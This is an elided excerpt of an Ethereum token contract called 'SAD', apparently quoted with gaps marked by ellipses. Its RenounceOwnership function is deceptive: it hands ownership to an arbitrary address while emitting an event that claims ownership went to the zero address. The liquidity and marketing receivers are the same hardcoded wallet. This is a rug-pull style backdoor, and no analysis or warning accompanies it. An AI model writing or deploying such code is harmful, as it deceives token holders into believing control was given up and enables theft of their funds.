...
abstract contract Ownable {
    ...
    function RenounceOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(address (0));}
...
contract Sad is IERC20, Ownable {
    ...
    string private constant _name = 'SAD';
    ...
    address public constant liquidity_receiver = 0xf19ec97aa1694423d7794e55c4069D8d5C347342; 
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address public constant marketing_receiver = 0xf19ec97aa1694423d7794e55c4069D8d5C347342;
